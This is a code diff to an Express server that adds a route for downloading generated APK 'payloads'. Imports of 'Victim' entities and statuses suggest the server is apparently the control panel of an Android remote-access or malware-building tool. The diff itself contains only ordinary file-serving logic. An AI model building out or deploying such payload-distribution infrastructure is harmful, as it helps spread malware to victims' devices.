@@ -1,6 +1,7 @@
 import 'reflect-metadata';
 
 import { useContainer as useContainerClassValidator } from 'class-validator';
+import dayjs from 'dayjs';
 import express, { type Application } from 'express';
 import expressStaticGzip from 'express-static-gzip';
 import { existsSync, readFileSync } from 'fs';
@@ -13,13 +14,13 @@ import {
 } from 'routing-controllers';
 import Container from 'typedi';
 
-import { VictimStatus } from '../common/enums';
+import { PayloadStatus, VictimStatus } from '../common/enums';
 import { config } from './config';
 import * as controllers from './controllers';
 import { setupDatabase } from './database';
 import { VictimEntity } from './entities';
 import { logger } from './logger';
-import { SocketService } from './services';
+import { PayloadService, SocketService } from './services';
 import { getPublicDir, timeConversion } from './utils/Common';
 
 useContainerClassValidator(Container);
@@ -100,6 +101,53 @@ function setupRoutes(): void {
             orderPreference: ['br', 'gzip'],
         }),
     );
+
+    app.get('/download/:id', (req, res) => {
+        const payloadService = Container.get(PayloadService);
+
+        const id = req.params.id;
+
+        if (typeof id !== 'string') {
+            res.status(400).send({ message: 'Invalid payload id' });
+            return;
+        }
+
+        payloadService
+            .findById(id)
+            .then((payload) => {
+                if (!payload) {
+                    res.status(404).send({ message: 'Payload not found' });
+                    return;
+                }
+
+                if (payload.status !== PayloadStatus.SUCCESS) {
+                    res.status(400).send({
+                        message: 'Payload is not processed successfully!',
+                    });
+                    return;
+                }
+
+                res.download(
+                    resolve(
+                        process.cwd(),
+                        config.APK_OUTPUT_PATH,
+                        `${payload.id}.apk`,
+                    ),
+                    `${config.APK_DOWNLOAD_PREFIX}-${dayjs(
+                        payload.createdAt,
+                    ).format('YYYYMMDD_HHmmss')}.apk`,
+                );
+            })
+            .catch((error: Error) => {
+                logger.error('Failed to download payload! ' + error.message, {
+                    label: 'server',
+                    action: 'download',
+                    error,
+                });
+
+                res.status(500).send({ message: 'Internal server error' });
+            });
+    });
 
     useExpressServer(app, {
         routePrefix: '/api',
